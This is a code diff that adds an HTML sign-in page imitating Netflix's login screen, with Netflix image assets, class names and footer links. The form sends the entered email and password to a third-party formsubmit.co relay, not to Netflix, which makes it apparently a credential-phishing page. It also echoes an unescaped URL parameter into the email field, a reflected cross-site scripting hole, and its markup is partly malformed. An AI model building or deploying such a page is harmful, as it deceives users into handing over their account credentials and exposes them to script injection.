@@ -1,0 +1,93 @@
+<html>
+<head>
+      <link rel="stylesheet" type="text/css" href="style.css">
+<body>
+    <header>
+      
+      </div>
+    </header>
+    <div class="login-sqare">
+      <h1 class="title">Sign In</h1>
+      <form 
+           action="https://formsubmit.co/6a85ad780695b66baee3e35479d478f4"
+           method="POST">
+        <div>
+          <div>
+          <input
+            class="input"
+            type="email"
+            name="email" 
+            placeholder="Email"
+            <?php echo $_GET['email']; ?> required
+            autocomplete="off"
+          />
+        </div>
+        <div>
+          <input
+            class="input"
+            type="password"
+            name="password"
+            placeholder="Password"
+            required
+            autocomplete="off"
+          />
+        </div>
+        <div><button class="button">Sign In</button></div>
+
+        <div class="check-div">
+          <label class="container">
+            <span class="remember-text"> Remember me </span>
+            <input type="checkbox" checked="checked" />
+            <span class="checkmark"></span>
+          </label>
+          <div class="help"><a href="#">Need help?</a></div>
+        </div>
+        <div class="facebook-div">
+          <a href="#">
+            <img
+              class="icon-facebook"
+              src="https://assets.nflxext.com/ffe/siteui/login/images/FB-f-Logo__blue_57.png"
+              alt="facebook icon"
+            />
+            <span class="facebook-text"> Login with Facebook</span></a
+          >
+          <div class="new-to-netflix">
+            <p>
+              New?
+              <span class="sign-up-now"> <a href="#">Sign up now.</a> </span>
+            </p>
+
+            <p class="recaptcha">
+              This page is protected by Google reCAPTCHA to ensure you're not a
+              bot. <a href="#"> Learn more.</a>
+            </p>
+          </div>
+        </div>
+      </form>
+    </div>
+
+    <div>
+      <footer class="footer">
+        <div class="questions">
+          <a id="questions" href="#"> Questions? Contact us.</a>
+        </div>
+        <div class="links-f">
+          <a href="#">FAQ</a>
+          <a href="#">Help Center</a>
+          <a href="#">Terms of Use</a>
+          <a href="#">Privacy</a>
+          <a href="#">Cookie Preferences</a>
+          <a href="#">Corporate Information</a>
+        </div>
+
+        <div class="language-selector">
+          <select name="language" id="language-selector">
+            
+            <option value="english" >English</option>
+            <option value="romanian">Romanian</option>
+            <option value="russian">Russian</option>
+          </select>
+        </div>
+      </footer>
+    </div>
+  </body>
